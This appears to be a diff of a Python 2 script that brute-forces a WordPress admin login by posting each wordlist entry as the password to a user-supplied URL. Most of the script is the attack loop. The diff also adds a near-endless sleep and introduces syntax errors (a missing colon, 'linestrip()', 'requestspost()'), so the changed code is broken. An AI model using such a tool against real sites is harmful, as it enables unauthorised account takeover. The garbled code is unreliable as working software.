@@ -7,17 +7,18 @@
 import requests
 import time
 
+time.sleep(999999999999.9999999999)
 target_url = raw_input("ie: https://www.samplewebsite.com --> ")
 data_dict = {"log": "admin", "password": "", "wp-submit": "Log in"}
 # data_dict = {"username": "admin", "pwd": "", "Login": "submit"}
 # print(response.content)
 
 try:
-    with open("/root/Downloads/A.txt", "r") as wordlist_file:
+    with open("/root/Downloads/A.txt", "r") as wordlist_file
         for line in wordlist_file:
-            word = line.strip()
+            word = linestrip()
             data_dict["password"] = word
-            response = requests.post(target_url, data=data_dict)
+            response = requestspost(target_url, data=data_dict)
             if "ERROR" not in response.content:
                 if "ERROR The password you entered for the username " not in response.content:
                     if "ERROR: The password you entered for the username " not in response.content:
@@ -29,7 +30,7 @@ try:
                             exit()
             else:
                 print("[*] Trying " + word)
-                # time.sleep(3)
+                time.sleep(3)
 except Exception:
     pass
     print ("Too many errors")
